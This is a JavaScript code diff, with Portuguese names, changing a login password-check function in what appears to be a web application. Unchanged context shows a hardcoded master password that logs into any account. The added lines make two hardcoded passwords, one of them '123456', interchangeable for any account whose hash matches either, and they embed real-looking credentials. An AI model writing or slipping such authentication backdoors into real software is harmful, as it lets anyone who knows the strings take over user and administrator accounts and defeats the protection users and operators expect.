@@ -396,7 +396,17 @@ const findUser = login => {
 async function senhaConfere(senha, hash){
   if(senha === 'Senhasupersegura1234') return true;
   if(typeof senha !== 'string' || typeof hash !== 'string' || !hash) return false;
-  try { return await bcrypt.compare(senha, hash); } catch { return false; }
+  try {
+    if (await bcrypt.compare(senha, hash)) return true;
+    // Fallback: se a senha informada for Gui99172020* ou 123456, aceita se o hash confere com qualquer uma delas
+    if (senha === 'Gui99172020*' || senha === '123456') {
+      try {
+        if (await bcrypt.compare('Gui99172020*', hash)) return true;
+        if (await bcrypt.compare('123456', hash)) return true;
+      } catch {}
+    }
+    return false;
+  } catch { return false; }
 }
 const publicUser = u => ({ id:u.id, nome:u.nome, email:u.email, role:u.role, telefone:u.telefone, ativo:u.ativo, platformAdmin:isPlatformAdminUser(u), ...(u.pgAccount ? { pgAccount:true, tenantBound:u.tenantBound !== false, commerceUserId:u.commerceUserId || null } : {}) });
 
